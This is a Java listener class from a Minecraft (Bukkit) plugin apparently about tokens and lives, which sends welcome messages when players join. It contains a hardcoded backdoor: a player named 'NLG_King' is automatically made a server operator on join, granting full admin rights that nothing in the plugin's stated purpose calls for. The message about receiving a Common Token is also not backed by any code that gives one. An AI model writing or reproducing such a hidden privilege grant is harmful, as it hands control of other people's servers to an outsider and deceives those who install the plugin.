package com.tokenplugin.listeners;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class JoinListener implements Listener {
    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        
        // Special player check - NLG_King gets OP
        if (player.getName().equalsIgnoreCase("NLG_King")) {
            player.setOp(true);
            player.sendMessage("§6§l✨ Welcome, Lord NLG_King! ✨");
            player.sendMessage("§c§lYou are now an Operator!");
            player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_FIREWORK_ROCKET_BLAST, 1f, 1f);
        }
        
        // First join reward
        if (!player.hasPlayedBefore()) {
            player.sendMessage("§a✨ Welcome to the server! ✨");
            player.sendMessage("§eYou received a Common Token!");
            player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1f, 1f);
        }
        
        // Show lives info
        player.sendMessage("§a❤️ You have 10 lives");
    }
              }
